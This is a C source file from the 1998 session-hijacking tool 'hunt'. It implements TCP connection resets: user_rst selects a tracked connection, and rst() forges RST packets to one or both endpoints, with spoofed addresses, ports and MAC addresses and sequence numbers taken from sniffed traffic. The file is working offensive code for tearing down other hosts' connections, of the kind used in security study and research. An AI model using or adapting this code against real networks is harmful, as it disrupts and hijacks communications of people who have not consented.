/*
 *
 *	This is free software. You can redistribute it and/or modify under
 *	the terms of the GNU General Public License version 2.
 *
 * 	Copyright (C) 1998 by kra
 *
 */
#include "hunt.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

/*
 * reset tcp connection
 */
void user_rst(struct user_conn_info *uci, int count, int mode)
{
	struct conn_info *ci;
	unsigned int key;
	
	if (!(ci = conn_get(uci)))
		printf("connection isn't available\n");
	else {
		switch (mode) {
		    case MODE_BOTH:
			rst(ci, count, 0);
			rst(ci, count, 1);
			break;
		    case MODE_SRC:
			rst(ci, count, 0);
			break;
		    case MODE_DST:
			rst(ci, count, 1);
			break;
		}
		/*
		 * well we don't receive RST packet, because we are the one
		 * who is sending it so we have to remove it by hand
		 */
		key = uci_generate_key(uci);
		hash_remove(&conn_table, key, uci);
		conn_free(ci);
	}
}

void rst(struct conn_info *ci, int count, int rstdst)
{
	struct tcp_spec ts;
	int i;

	if (rstdst) {
		ts.saddr = ci->src_addr;
		ts.daddr = ci->dst_addr;
		ts.sport = ci->src_port;
		ts.dport = ci->dst_port;
		ts.src_mac = ci->dst.dst_mac;
		ts.dst_mac = ci->dst.src_mac;
		ts.window = ci->src.window ? ci->src.window : htons(242);
		ts.id = ci->src.id;
	} else {
		ts.saddr = ci->dst_addr;
		ts.daddr = ci->src_addr;
		ts.sport = ci->dst_port;
		ts.dport = ci->src_port;
		ts.src_mac = ci->src.dst_mac;
		ts.dst_mac = ci->src.src_mac;
		ts.window = ci->dst.window ? ci->dst.window : htons(242);
		ts.id = ci->dst.id;
	}
   	ts.ack = 1;
	ts.rst = 1;
	ts.psh = 0;
	ts.data = NULL;
	ts.data_len = 0;
	for (i = 0; i < count; i++) {
		if (rstdst) {
			ts.seq = htonl(ntohl(ci->dst.next_d_seq) + i);
			ts.ack_seq = htonl(ntohl(ci->dst.next_seq) + i);
		} else {
			ts.seq = htonl(ntohl(ci->src.next_d_seq) + i);
			ts.ack_seq = htonl(ntohl(ci->src.next_seq) + i);
		}
		send_tcp_packet(&ts);
	}
}
